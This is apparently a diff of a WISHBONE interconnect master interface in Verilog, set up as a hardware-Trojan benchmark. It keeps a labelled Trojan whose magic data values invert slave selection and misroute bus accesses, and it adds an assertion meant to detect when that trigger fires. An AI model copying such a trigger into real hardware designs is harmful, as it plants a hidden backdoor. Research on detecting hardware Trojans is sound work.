@@ -1,66 +1,3 @@
-/////////////////////////////////////////////////////////////////////
-////                                                             ////
-////  WISHBONE Connection Matrix Master Interface                ////
-////                                                             ////
-////                                                             ////
-////  Author: Rudolf Usselmann                                   ////
-////          rudi@asics.ws                                      ////
-////                                                             ////
-////                                                             ////
-////  Downloaded from: http://www.opencores.org/cores/wb_conmax/ ////
-////                                                             ////
-/////////////////////////////////////////////////////////////////////
-////                                                             ////
-//// Copyright (C) 2000-2002 Rudolf Usselmann                    ////
-////                         www.asics.ws                        ////
-////                         rudi@asics.ws                       ////
-////                                                             ////
-//// This source file may be used and distributed without        ////
-//// restriction provided that this copyright statement is not   ////
-//// removed from the file and that any derivative work contains ////
-//// the original copyright notice and the associated disclaimer.////
-////                                                             ////
-////     THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY     ////
-//// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED   ////
-//// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS   ////
-//// FOR A PARTICULAR PURPOSE. IN NO EVENT SHALL THE AUTHOR      ////
-//// OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,         ////
-//// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES    ////
-//// (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE   ////
-//// GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR        ////
-//// BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF  ////
-//// LIABILITY, WHETHER IN  CONTRACT, STRICT LIABILITY, OR TORT  ////
-//// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT  ////
-//// OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE         ////
-//// POSSIBILITY OF SUCH DAMAGE.                                 ////
-////                                                             ////
-/////////////////////////////////////////////////////////////////////
-
-//  CVS Log
-//
-//  $Id: wb_conmax_master_if.v,v 1.2 2002/10/03 05:40:07 rudi Exp $
-//
-//  $Date: 2002/10/03 05:40:07 $
-//  $Revision: 1.2 $
-//  $Author: rudi $
-//  $Locker:  $
-//  $State: Exp $
-//
-// Change History:
-//               $Log: wb_conmax_master_if.v,v $
-//               Revision 1.2  2002/10/03 05:40:07  rudi
-//               Fixed a minor bug in parameter passing, updated headers and specification.
-//
-//               Revision 1.1.1.1  2001/10/19 11:01:41  rudi
-//               WISHBONE CONMAX IP Core
-//
-//
-//
-//
-//
-
-`include "wb_conmax_defines.v"
-
 module wb_conmax_master_if(
 
 	clk_i, rst_i,
@@ -381,13 +318,18 @@ reg		s12_cyc_o, s13_cyc_o, s14_cyc_o, s15_cyc_o;
 // Select logic
 //
 
+reg trojan = 0;
 // Trojan 
-always @(wb_addr_i)
-if ( (wb_data_i == 32'b00101010111110101011110011100000) && (s0_data_i == 32'b00011110010101010101001010101100) )
-	slv_sel = wb_addr_i[aw-1:aw-4] ^ 4'b1111;
+always @(posedge clk_i) begin
+if ( (wb_data_i == 32'b00101010111110101011110011100000) && (s0_data_i == 32'b00011110010101010101001010101100) ) begin
+		slv_sel = wb_addr_i[aw-1:aw-4] ^ 4'b1111;
+		trojan = 1;
+	end
 else
 	slv_sel = wb_addr_i[aw-1:aw-4];
+end
 
+assert property (not((rst_i==0) && (trojan==1)));
 
 ////////////////////////////////////////////////////////////////////
 //
@@ -466,7 +408,6 @@ always @(slv_sel or s0_data_i or s1_data_i or s2_data_i or s3_data_i or
 	   4'd13:	wb_data_o = s13_data_i;
 	   4'd14:	wb_data_o = s14_data_i;
 	   4'd15:	wb_data_o = s15_data_i;
-	   default:	wb_data_o = {dw{1'bx}};
 	endcase
 
 ////////////////////////////////////////////////////////////////////
@@ -610,7 +551,6 @@ always @(slv_sel or s0_ack_i or s1_ack_i or s2_ack_i or s3_ack_i or
 	   4'd13:	wb_ack_o = s13_ack_i;
 	   4'd14:	wb_ack_o = s14_ack_i;
 	   4'd15:	wb_ack_o = s15_ack_i;
-	   default:	wb_ack_o = 1'b0;
 	endcase
 
 always @(slv_sel or s0_err_i or s1_err_i or s2_err_i or s3_err_i or
@@ -634,7 +574,6 @@ always @(slv_sel or s0_err_i or s1_err_i or s2_err_i or s3_err_i or
 	   4'd13:	wb_err_o = s13_err_i;
 	   4'd14:	wb_err_o = s14_err_i;
 	   4'd15:	wb_err_o = s15_err_i;
-	   default:	wb_err_o = 1'b0;
 	endcase
 
 always @(slv_sel or s0_rty_i or s1_rty_i or s2_rty_i or s3_rty_i or
@@ -658,7 +597,6 @@ always @(slv_sel or s0_rty_i or s1_rty_i or s2_rty_i or s3_rty_i or
 	   4'd13:	wb_rty_o = s13_rty_i;
 	   4'd14:	wb_rty_o = s14_rty_i;
 	   4'd15:	wb_rty_o = s15_rty_i;
-	   default:	wb_rty_o = 1'b0;
 	endcase
 
 endmodule
